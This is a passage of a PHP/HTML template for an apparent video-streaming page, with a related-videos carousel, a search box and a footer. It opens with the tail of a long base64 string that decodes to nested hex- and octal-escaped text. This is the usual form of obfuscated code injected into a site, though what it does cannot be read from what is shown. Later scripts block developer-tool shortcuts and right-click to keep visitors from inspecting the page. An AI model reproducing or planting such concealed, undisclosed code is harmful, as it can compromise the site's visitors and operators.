OFx4MzRceDRlXHg1NFwxMjJcMTQzXDE0NVwxMDRceDU2XHg2OFx4NThceDQ0XDEwNVx4MzBceDRkXDYxXHg3OFx4MzRcMTE2XDE1Mlx4NTZceDYzXHg2NVwxMDRcMTIxXDYwXHg1OFwxMTBceDY3XHgzMVwxMzFceDU2XHg3N1wxNzBceDRlXHg1NFx4NDZcMTQzXHg0ZFwxMjRcMTE1XDE2N1x4NThceDQ0XHg0NVx4NzhcMTE1XHg0NlwxNzBceDM0XDExNlx4NmFceDY0XHg2M1wxNDVcMTA0XHg0ZFwxNjdceDU4XHg0NFx4NDVcMTcyXDExNVx4NmNcMTcwXHgzNFwxMTZceDZkXDExNlwxNDNceDY1XHg0NFx4NjNcNjNceDU4XHg0NFwxMDVcNjNceDRkXHg0NlwxNzBceDM0XHg0ZVwxMDdceDU2XDE0M1x4NjVcMTA0XHg2NFwxNTBceDU4XHg0NFwxMDVcMTY3XDExNlwxNTRceDc4XDY0XHg0ZVx4NmFceDRlXHg2M1wxMTVceDU0XDEyMVx4MzFcMTMwXDExMFx4NjdceDMwXHg0ZVwxMDZceDc3XDE3MFx4NGRcMTUyXHg0NlwxNDNceDY1XHg0NFx4NjNceDM0XHg1OFx4NDhcMTQ3XDYxXDExN1wxMDZcMTY3XDE3MFwxMTVceDQ0XHg1MlwxNDNceDRkXDEyNFx4NTFceDdhXHg1OFx4NDhcMTQ3XHg3YVx4NGRcMTI2XDE2N1wxNzBceDRkXHg1NFx4NDZcMTQzXHg2NVx4NDRceDU5XDY1XHg1OFwxMDRceDQ1XDYxXDExNVw2MVx4NzhceDM0XHg0ZVx4N2FceDQyXDE0M1wxNDVceDQ0XDEyMlx4NmRceDU4XHg0NFx4NDVcNjNcMTE1XHg1Nlx4NzhceDM0XHg0ZVx4NDRcMTA2XDE0M1wxNDVceDQ0XHg0ZVx4NmJcMTExXDE1MVwxNTNceDcwXHg0Zlx4NzlcMTAxXDc1IikpOyA=')); ?> </script>
          <link href="/site_assets/videojs_player/css/videojs_style1.min.css" rel="stylesheet" type="text/css">
          <!-- Start Page Content Area -->
          <!-- Start You May Also Like Video Carousel -->
          <div class="video-carousel-area vfx-item-ptb related-video-item">
            <div class="video-carousel-area vfx-item-ptb">
              <div class="container-fluid">
                <div class="row"></div>
                <div class="container-fluid">
                  <!-- Start Video Post -->
                  <div class="video-post-wrapper">
                    <div class="row mt-30">
                      <div class="col-lg-12 col-md-12 col-sm-12">
                        <div class="video-posts-data mt-0 mb-0">
                          <div class="video-post-info">
                            <h2> <?php  echo $name?> - <?php include('title.php'); ?> </h2>
                            <div class="video-post-date">
                              <span class="video-posts-author">
                                <i class="fa fa-eye"></i> <?php 
            include('desc.php');  
       
            ?> </span>
                              <span class="video-posts-author">
                                <i class="fa fa-calendar-alt"></i> <?php include('z.php'); ?> </span>
                              <span class="video-posts-author">
                                <i class="fa fa-clock"> <?php include('time.php'); ?>Minutes - </i>RunTime </span>
                            </div>
                            <ul class="actor-video-link">
                              <li>
                                <a href="/Movies" title="Movies">Movies</a>
                              </li>
                              <li>
                                <a href="/Series" title="Series">Series</a>
                              </li>
                              <li>
                                <a href="/LiveTv" title="Action">LiveTV</a>
                              </li>
                              <li>
                                <a href="/Home" title="SonyLiv">HomePage</a>
                              </li>
                            </ul>
                            </ul>
                          </div>
                          <div></div>
                        </div>
                        <!-- End Slider Area -->
                        <div class="video-shows-section live-tv-video-block vfx-item-ptb">
                          <div class="container-fluid">
                            <div class="row">
                              <div class="col-md-12">
                                <div class="vfx-item-section">
                                  <a href="#" title="Live TV">
                                    <h3>Related</h3>
                                  </a>
                                  <span class="view-more"></span>
                                </div>
                                <div class="tv-season-video-carousel owl-carousel"> <?php
 
  $edzx = "Data.json";
 $json = json_decode(file_get_contents($group.$edzx) , true);
foreach ($json as $channel)
{

      printf("
																							<div class=\"single-video\">
																								<a href=\"play.php?id=%s\">" , $channel['id']); 
 
        printf("
																									<div class=\"video-img\">
																										<div class=\"vid-lab-premium\">
																											<img src=\"https://videoportal.viavilab.com/site_assets/images/ic-premium.png\">" . PHP_EOL, $channel['logo']); 
    printf(" 
																											</div>
																											<span class=\"video-item-content\">%s</span>" . PHP_EOL, $channel['name']); 
    printf("
																											<img src=\"%s\">" . PHP_EOL, $channel['logo']); 
    echo '
																											</div>
																										</a>
																									</div>' . PHP_EOL; 
 
  
}
?> </div>
                              </div>
                            </div>
                          </div>
                          <footer>
                            <div class="footer-area vfx-item-ptb">
                              <div class="footer-wrapper">
                                <div class="container-fluid">
                                  <div class="row">
                                    <div class="col-lg-5 col-md-5 col-sm-12 col-xs-12">
                                      <div class="footer-bottom">
                                        <div class="footer-links">
                                          <ul>
                                            <li>
                                              <a href="/about-us" title="About Us">About Us</a>
                                            </li>
                                            <li>
                                              <a href="terms-of-use" title="Terms Of Use">Terms Of Use</a>
                                            </li>
                                          </ul>
                                        </div>
                                        <div class="copyright-text">
                                          <p>Copyright © 2023 All Rights Reserved.</p>
                                        </div>
                                      </div>
                                    </div>
                                    <div class="col-lg-3 col-md-3 col-sm-12 col-xs-12">
                                      <div class="single-footer">
                                        <div class="footer-heading-wrap">
                                          <h3 class="footer-heading">Connect with us</h3>
                                        </div>
                                        <div class="social-links">
                                          <ul></ul>
                                        </div>
                                      </div>
                                    </div>
                                    <div class="col-lg-4 col-md-4 col-sm-12 col-xs-12">
                                      <div class="single-footer">
                                        <div class="footer-heading-wrap">
                                          <h3 class="footer-heading">Apps</h3>
                                        </div>
                                        <div class="download-app-link-item">
                                          <a class="google-play-download" href="/App" target="_blank" title="Google Play">
                                            <img src="https://videoportal.viavilab.com/site_assets/images/google-play.png" alt="Google Play Download" title="Google Play Download">
                                          </a>
                                          <a class="apple-store-download" href="#" target="_blank" title="Apple Store">
                                            <img src="https://videoportal.viavilab.com/site_assets/images/app-store.png" alt="Apple Store Download" title="Apple Store Download">
                                          </a>
                                        </div>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              </div>
                            </div>
                            <!-- Start Scroll Top Area -->
                            <div class="scroll-top">
                              <div class="scroll-icon">
                                <i class="fa fa-angle-up"></i>
                              </div>
                            </div>
                            <!-- End Scroll Top Area -->
                          </footer>
                          <!-- End Footer Area -->
                          <div id="popup1" class="popup-view popup-overlay">
                            <div class="search">
                              <div class="search-container has-results">
                                <span class="title">Search</span>
                                <div class="search-input">
                                  <input type="text" name="s" id="search_box" class="search-container-input" placeholder="Title" onkeyup="showSuggestions(this.value)" style="background: #000000;">
                                </div>
                              </div>
                              <div class="search-results mt-4" id="search_output"></div>
                            </div>
                            <a class="close" href="#" title="close">
                              <i class="ion-close-round"></i>
                            </a>
                          </div>
                          <!-- Start Styles Switcher -->
                          <div id="styles-switcher" class="left">
                            <h2 class="text-3">Color Switcher</h2>
                            <ul>
                              <li class="aqua" data-bs-toggle="tooltip" data-path="https://videoportal.viavilab.com/site_assets/css/color-style/style-one.css" aria-label="Aqua"></li>
                              <li class="green" data-bs-toggle="tooltip" data-path="https://videoportal.viavilab.com/site_assets/css/color-style/style-two.css" aria-label="Green"></li>
                              <li class="blue" data-bs-toggle="tooltip" data-path="https://videoportal.viavilab.com/site_assets/css/color-style/style-three.css" aria-label="Blue"></li>
                              <li class="orange" data-bs-toggle="tooltip" data-path="https://videoportal.viavilab.com/site_assets/css/color-style/style-four.css" aria-label="Orange"></li>
                              <li class="poolgreen" data-bs-toggle="tooltip" data-path="https://videoportal.viavilab.com/site_assets/css/color-style/style-five.css" aria-label="Poolgreen"></li>
                              <li class="red" data-bs-toggle="tooltip" data-path="https://videoportal.viavilab.com/site_assets/css/color-style/style-six.css" aria-label="Red"></li>
                            </ul>
                            <button class="btn switcher-toggle">
                              <i class="fas fa-cog fa-spin"></i>
                            </button>
                          </div>
                          <!-- End Styles Switcher -->
                          <div class="eupopup eupopup-bottom"></div>
                          <!-- Load Local JS -->
                          <script src="https://videoportal.viavilab.com/site_assets/js/jquery-3.3.1.min.js"></script>
                          <script src="https://videoportal.viavilab.com/site_assets/js/jquery.easing.min.js"></script>
                          <script src="https://videoportal.viavilab.com/site_assets/js/bootstrap.min.js"></script>
                          <script src="https://videoportal.viavilab.com/site_assets/js/owl.carousel.min.js"></script>
                          <script src="https://videoportal.viavilab.com/site_assets/js/jquery.nice-select.min.js"></script>
                          <script src="https://videoportal.viavilab.com/site_assets/js/megamenu.js"></script>
                          <script src="https://videoportal.viavilab.com/site_assets/js/switcher.min.js"></script>
                          <!-- Splide Slider JS -->
                          <script src="https://videoportal.viavilab.com/site_assets/js/splide.min.js"></script>
                          <!-- Custom Main JS -->
                          <script src="https://videoportal.viavilab.com/site_assets/js/custom-main.js"></script>
                          <script src="https://videoportal.viavilab.com/site_assets/js/jquery-eu-cookie-law-popup.js"></script>
                          <script type="text/javascript">
                            $(document).ready(function() {
                              if ($(".eupopup").length > 0) {
                                $(document).euCookieLawPopup().init({
                                  'cookiePolicyUrl': '#',
                                  'buttonContinueTitle': 'Continue',
                                  'buttonLearnmoreTitle': 'Learn more',
                                  'popupPosition': 'bottom',
                                  'colorStyle': 'default',
                                  'compactStyle': false,
                                  'popupTitle': 'This website is using cookies',
                                  'popupText': 'We use them to give you the best experience. If you continue using our website, we&#039;ll assume that you are happy to receive all cookies on this website.'
                                });
                              }
                            });

                            function showSuggestions(inputString) {
                              if (inputString.length <= 1) {
                                //document.getElementById('search_output').innerHTML = 'Search field empty!';
                                document.getElementById('search_output').innerHTML = '';
                              } else {
                                $.ajax({
                                  url: "https://videoportal.viavilab.com/search_elastic",
                                  method: "GET",
                                  data: {
                                    's': inputString
                                  },
                                  dataType: 'text',
                                  beforeSend: function() {
                                    $("#search_box").css("background", "#000000 url(https://videoportal.viavilab.com/site_assets/images/LoaderIcon.gif) no-repeat 100%");
                                  },
                                  success: function(result) {
                                    //alert(result);
                                    //$("#search_output").html = result;
                                    $("#search_output").html(result);
                                    $("#search_box").css("background", "#000000");
                                  }
                                });
                              }
                            }
                            $('#trailer_model_button').on('click', function(e) {
                              player.pause();
                            });
                            $('#close_trailer_pop').on('click', function(e) {
                              player_trailer.pause();
                            });
                          </script>
                          <script type="text/javascript">
                            $("li[data-path]").click(function() {
                              $("head link#theme").attr("href", $(this).data("path"));
                            });
                          </script>
                          <script type="text/javascript">
                            $(window).on("load", function() {
                              document.onkeydown = function(e) {
                                if (e.keyCode == 123) {
                                  return false;
                                }
                                if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
                                  return false;
                                }
                                if (e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
                                  return false;
                                }
                                if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
                                  return false;
                                }
                                if (e.ctrlKey && e.shiftKey && e.keyCode == 'C'.charCodeAt(0)) {
                                  return false;
                                }
                              };
                              $("html").on("contextmenu", function() {
                                return false;
                              });
                            });
                          </script>
      </body>
    </html>